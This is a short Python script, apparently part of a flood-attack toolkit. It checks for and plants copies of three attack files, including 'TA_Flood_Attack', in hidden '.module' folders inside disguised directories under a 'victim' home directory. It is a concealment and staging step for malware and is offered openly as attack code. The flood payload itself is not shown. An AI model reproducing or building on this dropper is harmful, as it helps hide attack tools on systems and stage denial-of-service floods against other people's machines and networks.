import os

attackDirs = ['/home/victim/.etc', '/home/victim/.var']
attackFiles = ['/Launch_Attack.py', '/SetUp_Attack.py', '/TA_Flood_Attack']


def check_attack():
    if not is_set_up_attack():
        print('Set up attack module...')
        set_up_attack()
    else:
        print('Already set up attack module.')


def set_up_attack():
    if is_set_up_attack():
        return

    # Make directories
    for attackDir in attackDirs:
        os.system('mkdir {0}'.format(attackDir))
        os.system('mkdir {0}/.module'.format(attackDir))
        os.system('cp Launch_Attack.py {0}/.module/'.format(attackDir))
        os.system('cp SetUp_Attack.py {0}/.module/'.format(attackDir))
        os.system('cp TA_Flood_Attack {0}/.module/'.format(attackDir))


def is_set_up_attack():
    for attackDir in attackDirs:
        for attackFile in attackFiles:
            if not os.path.isfile(attackDir + '/.module' + attackFile):
                return False

    return True


if __name__ == '__main__':
    check_attack()
